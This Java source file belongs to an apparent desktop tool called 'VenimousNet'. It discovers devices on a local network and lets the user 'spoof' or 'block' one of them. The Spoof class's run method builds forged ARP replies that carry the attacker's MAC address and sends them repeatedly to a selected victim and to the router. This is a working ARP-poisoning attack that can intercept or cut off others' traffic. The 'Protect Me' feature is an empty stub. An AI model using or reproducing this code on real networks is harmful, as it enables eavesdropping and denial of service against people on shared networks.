
package MainClass;

import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;
import java.util.Observable;
import java.util.Observer;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.ListSelectionModel;
import javax.swing.UIManager;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableCellRenderer;

import org.jb2011.lnf.beautyeye.BeautyEyeLNFHelper;
import org.jnetpcap.PcapIf;
import org.jnetpcap.packet.JPacket;

/**
 *
 * @author Fadhlaoui
 */
@SuppressWarnings("serial")
public class NewJFrame extends javax.swing.JFrame implements Observer {


    private DevicesTableModel tableModel = new DevicesTableModel();
    public static int interface_number=0;
    private JTable table;
    private JButton StopButton = new JButton("Stop");
    private JButton BlockButton = new JButton("Block");
    private Spoof selectedDevice;
    private boolean clearing;

	public ConnectedDevice Router_IP;

	public String CapturePath;
    public NewJFrame() {
        initComponents();
    }
                          
    private void initComponents()  {

        jScrollPane1 = new javax.swing.JScrollPane();
        logs = new javax.swing.JTextArea();
        jLabel1 = new javax.swing.JLabel();
        Nics = new javax.swing.JComboBox<>();
        addPanel = new javax.swing.JPanel();
        jMenuBar1 = new javax.swing.JMenuBar();
        Discover_Item = new javax.swing.JMenu();
        Discover = new javax.swing.JMenuItem();
        Spoof_Item = new javax.swing.JMenu();
        SpoofM = new javax.swing.JMenuItem();
        Protect_Item = new javax.swing.JMenu();
        Protect = new javax.swing.JMenuItem();
        AboutMenu = new javax.swing.JMenu();
        Help_Item = new javax.swing.JMenuItem();
        About_Item = new javax.swing.JMenuItem();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("VenimousNet");
        setName("Frame"); // NOI18N

        logs.setBackground(new java.awt.Color(0, 0, 0));
        logs.setColumns(20);
        logs.setForeground(new java.awt.Color(0, 204, 0));
        logs.setRows(5);
        logs.setBorder(javax.swing.BorderFactory.createTitledBorder(null, "Logs", javax.swing.border.TitledBorder.LEADING, javax.swing.border.TitledBorder.TOP, new java.awt.Font("Tahoma", 0, 11), new java.awt.Color(255, 255, 255))); // NOI18N
        logs.setDisabledTextColor(new java.awt.Color(0, 0, 0));
        jScrollPane1.setViewportView(logs);

        jLabel1.setText("Select an iterface :");
        ListNIFs NICS = new ListNIFs();
        List <String> NetCrdInt = NICS.getDevicesNames();
        String []  Items  = new String[NetCrdInt.size()] ;
        short number=0;
        for(String device:NetCrdInt){
        	Items[number]=device;
        	number+=1;
        }
        Nics.setModel(new javax.swing.DefaultComboBoxModel<>(Items));
        Nics.addActionListener(new ActionListener() {
			
			@SuppressWarnings("rawtypes")
			@Override
			public void actionPerformed(ActionEvent e) {
				JComboBox cb = (JComboBox)e.getSource();
		       String Selected_interface=((String)cb.getSelectedItem());
		       for(int index=0;index<NetCrdInt.size();index++){
		    	  
		    	   if(NetCrdInt.get(index).equals(Selected_interface)){
		    		   interface_number=index;
		    		   /*
		    		   System.out.println(NetCrdInt.get(index));
		    		   System.out.println((interface_number));
		    		   */
		    	   }
		       }
				
			}
		});
        javax.swing.GroupLayout addPanelLayout = new javax.swing.GroupLayout(addPanel);
        addPanel.setLayout(addPanelLayout);
        addPanelLayout.setHorizontalGroup(
            addPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 452, Short.MAX_VALUE)
        );
        addPanelLayout.setVerticalGroup(
            addPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 273, Short.MAX_VALUE)
        );

        Discover_Item.setText("Discover");

        Discover.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_D, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        Discover.setText("Discover");
        Discover_Item.add(Discover);

        jMenuBar1.add(Discover_Item);

        Spoof_Item.setText("Spoof");

        SpoofM.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_S, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        SpoofM.setText("Spoof");
        SpoofM.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                SpoofActionPerformed(evt);
            }
        });
        Spoof_Item.add(SpoofM);

        jMenuBar1.add(Spoof_Item);

        Protect_Item.setText("Protect Me");

        Protect.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_P, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        Protect.setText("Protect Me");
        Protect.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ProtectActionPerformed(evt);
            }
        });
        Protect_Item.add(Protect);

        jMenuBar1.add(Protect_Item);

        AboutMenu.setText("?");

        Help_Item.setText("Help");
        Help_Item.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Help_ItemActionPerformed(evt);
            }
        });
        AboutMenu.add(Help_Item);

        About_Item.setText("About");
        AboutMenu.add(About_Item);

        jMenuBar1.add(AboutMenu);

        setJMenuBar(jMenuBar1);

        JPanel Panel = new JPanel();
        JButton addButton = new JButton("Start Spoofing");
        addButton.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            try {
    			actionAdd();
    		} catch (IOException | InterruptedException e1) {
    			
    			e1.printStackTrace();
    		}
          }
        });
        Panel.add(addButton);
        table = new JTable(tableModel);
        table.getSelectionModel().addListSelectionListener(new ListSelectionListener() {
          public void valueChanged(ListSelectionEvent e) {
            tableSelectionChanged();
          }
        });
        table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);



        JPanel Devices = new JPanel();
        Devices.setBorder(BorderFactory.createTitledBorder("Devices"));
        Devices.setLayout(new BorderLayout());
        Devices.add(new JScrollPane(table), BorderLayout.CENTER);

        JPanel buttonsPanel = new JPanel();

        StopButton.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            actionStop();
          }
        });
        
        BlockButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
              actionSpoof();
            }
          });
        BlockButton.setEnabled(true);
        buttonsPanel.add(BlockButton);
        
        StopButton.setEnabled(false);
        buttonsPanel.add(StopButton);

        addPanel.setLayout(new BorderLayout());
        addPanel.add(Panel, BorderLayout.NORTH);
        addPanel.add(Devices, BorderLayout.CENTER);
        addPanel.add(buttonsPanel, BorderLayout.SOUTH);
        
        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(18, 18, 18)
                        .addComponent(jLabel1)
                        .addGap(49, 49, 49)
                        .addComponent(Nics, javax.swing.GroupLayout.PREFERRED_SIZE, 189, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(addPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 18, Short.MAX_VALUE)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 189, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jScrollPane1))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(26, 26, 26)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel1)
                            .addComponent(Nics, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 51, Short.MAX_VALUE)
                        .addComponent(addPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(30, 30, 30))
        );

        pack();
    }// </editor-fold>                        

    private void SpoofActionPerformed(java.awt.event.ActionEvent evt) {                                      
        // TODO add your handling code here:
    }                                     

    private void ProtectActionPerformed(java.awt.event.ActionEvent evt) {                                        
        // TODO add your handling code here:
    }                                       

    private void Help_ItemActionPerformed(java.awt.event.ActionEvent evt) {                                          
        // TODO add your handling code here:
    }                                        
    
    private void actionAdd() throws IOException, InterruptedException {
    	 CapturePath=new Cmd().Create_tmpFile();
    	
     GetAllDevices devicesList = new GetAllDevices(new File(CapturePath));
     @SuppressWarnings("unchecked")
  List <ConnectedDevice> L = devicesList.ReadFromFile();
      if(!L.isEmpty()){
      	for(ConnectedDevice device : L){
        tableModel.addDevice(new Spoof(device));
      	}
      	
      } else {
        JOptionPane.showMessageDialog(this, "Empty List", "Empty List",
            JOptionPane.ERROR_MESSAGE);
      }
    }


    private void tableSelectionChanged() {
      if (selectedDevice != null)
        selectedDevice.deleteObserver(NewJFrame.this);

      if (!clearing && table.getSelectedRow() > -1) {
        selectedDevice = tableModel.getDevice(table.getSelectedRow());
        selectedDevice.addObserver(NewJFrame.this);
        updateButtons();
      }
    }

    private void actionStop() {
      selectedDevice.Stop();
      updateButtons();
    }
  private void actionSpoof(){
  	selectedDevice.Spoof();
  }
    private void updateButtons() {
      if (selectedDevice != null) {
        int status = selectedDevice.getStatus();
        switch (status) {
        case Spoof.Spoofing:
          StopButton.setEnabled(true);
          BlockButton.setEnabled(false);
          
          break;
        case Spoof.Stop_Spoofing:
      	  StopButton.setEnabled(false);
          BlockButton.setEnabled(true);
         
          break;
        
        default: 
      	 StopButton.setEnabled(false);
          BlockButton.setEnabled(false);
         
        }
      } else {
      	StopButton.setEnabled(false);
        BlockButton.setEnabled(false);
     
      }
    }

    public void update(Observable o, Object arg) {
      if (selectedDevice != null && selectedDevice.equals(o))
        updateButtons();
    }

    
    /**
     * @param args the command line arguments
     * @throws Exception 
     */
   
                    
    private javax.swing.JMenu AboutMenu;
    private javax.swing.JMenuItem About_Item;
    private javax.swing.JMenuItem Discover;
    private javax.swing.JMenu Discover_Item;
    private javax.swing.JMenuItem Help_Item;
    private javax.swing.JComboBox<String> Nics;
    private javax.swing.JMenuItem Protect;
    private javax.swing.JMenu Protect_Item;
    private javax.swing.JMenuItem SpoofM;
    private javax.swing.JMenu Spoof_Item;
    private javax.swing.JPanel addPanel;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JScrollPane jScrollPane1;
    public static javax.swing.JTextArea logs;
    // End of variables declaration                   
}



class Spoof extends Observable implements Runnable {


  public static final String STATUSES[] = { "Spoofing...", "Not Blocked" };

  public static final int Spoofing = 0;

  public static final int Stop_Spoofing= 1;

  private String IP_ADDRESS;
  private String MAC_ADDRESS; 
  private int status; 
  public Spoof(ConnectedDevice device) {
    this.IP_ADDRESS = device.getIP_Address();
   this.MAC_ADDRESS=device.getMAC_Address();
    status = Stop_Spoofing;

  }
  public String getIP_ADDRESS() {
    return IP_ADDRESS;
  }
  
  public String getMAC_ADDRESS() {
    return MAC_ADDRESS;
  }
  
  public int getStatus() {
    return status;
  }

  public void Stop() {
    status = Stop_Spoofing;
    stateChanged();
    NewJFrame.logs.setText("");
  }

  public void Spoof() {
    status = Spoofing;
    stateChanged();
    start_Spoofing();
  }



  private void start_Spoofing() {
    Thread thread = new Thread(this);
 
    thread.start();
    
  }

  public void run() {
	  try {
		  
		  Address attacker = new Address();
			Create_EthernetFrame Ethernet = new Create_EthernetFrame();
			
			String CapturePath=new Cmd().Create_tmpFile();
				GetAllDevices devicesList = new GetAllDevices(new File(CapturePath));
			     @SuppressWarnings("unchecked")
				List <ConnectedDevice> L = devicesList.ReadFromFile();
			    
			     ConnectedDevice Router = L.get(0);
			     
			     String Router_IP =new Address().IPtoHex(Router.getIP_Address()).toString();
			     
			     String Router_MAC=Router.getMAC_Address().replace("-","");
			     
			     String Victim_IP=new Address().IPtoHex(getIP_ADDRESS()).toString();
			     
			     String MyMac=attacker.getMacAddress();
			     String Victim_Mac=getMAC_ADDRESS().replaceAll("-", "");
			    
			     JPacket ArpResponseToTheVictim=Ethernet.Generate_ArpReply(MyMac, Victim_Mac,Router_IP ,Victim_IP);
				 JPacket ArpResponseToTheRouter=Ethernet.Generate_ArpReply(MyMac, Router_MAC, Victim_IP, Router_IP);
				System.out.println("ArpResponseToTheVictim"+ArpResponseToTheVictim);
				System.out.println("ArpResponseToTheRouter"+ArpResponseToTheRouter);
				 while(getStatus()!= 1){
					 Thread.sleep(7000);
					
		  ByteBuffer a = ByteBuffer.wrap( ArpResponseToTheVictim.getByteArray(0,ArpResponseToTheVictim.size() ));
			ByteBuffer b = ByteBuffer.wrap( ArpResponseToTheRouter.getByteArray(0,ArpResponseToTheRouter.size() ));

		    
		    Start_Spoofing Spoof = new Start_Spoofing();
		    List <PcapIf> Nics =Spoof.getNics();
		   ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			PcapIf device=Spoof.PrepareDevice(Nics, NewJFrame.interface_number);
		    System.out.println(device.getName()+NewJFrame.interface_number);
		    Spoof.Send_Frame(device, a );
		    Spoof.Send_Frame(device, b );
	  stateChanged();
	
	 
		  }
	  
	  } catch (Exception e) {
			
		  NewJFrame.logs.setText(e.getMessage());
		}
 
  }

  private void stateChanged() {
    setChanged();
    notifyObservers();
  }
}

@SuppressWarnings("serial")
class DevicesTableModel extends AbstractTableModel implements Observer {
  private static final String[] columnNames = { "IP Address", "Mac Address", "Status" };

  @SuppressWarnings("rawtypes")
private static final Class[] columnClasses = { String.class, String.class,
      String.class };

  private ArrayList<Spoof> deviceList = new ArrayList<Spoof>();

  public void addDevice(Spoof device) {
    device.addObserver(this);
    deviceList.add(device);
    fireTableRowsInserted(getRowCount() - 1, getRowCount() - 1);
  }

  public Spoof getDevice(int row) {
    return (Spoof) deviceList.get(row);
  }


  public int getColumnCount() {
    return columnNames.length;
  }

  public String getColumnName(int col) {
    return columnNames[col];
  }

  @SuppressWarnings({ "unchecked", "rawtypes" })
public Class getColumnClass(int col) {
    return columnClasses[col];
  }

  public int getRowCount() {
    return deviceList.size();
  }

  public Object getValueAt(int row, int col) {
    Spoof device = deviceList.get(row);
    switch (col) {
    	case 0:
    		return device.getIP_ADDRESS();
    	case 1: 
    		String mac = device.getMAC_ADDRESS();
    		return mac;
    	case 2:
    		return Spoof.STATUSES[device.getStatus()];
    }
    		return "";
  }

  public void update(Observable o, Object arg) {
    int index = deviceList.indexOf(o);
    fireTableRowsUpdated(index, index);
  }
}

@SuppressWarnings("serial")
class ProgressRenderer extends JProgressBar implements TableCellRenderer {
  public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected,
      boolean hasFocus, int row, int column) {
	  setValue((int) ((Float) value).floatValue());
    return this;
  }
}
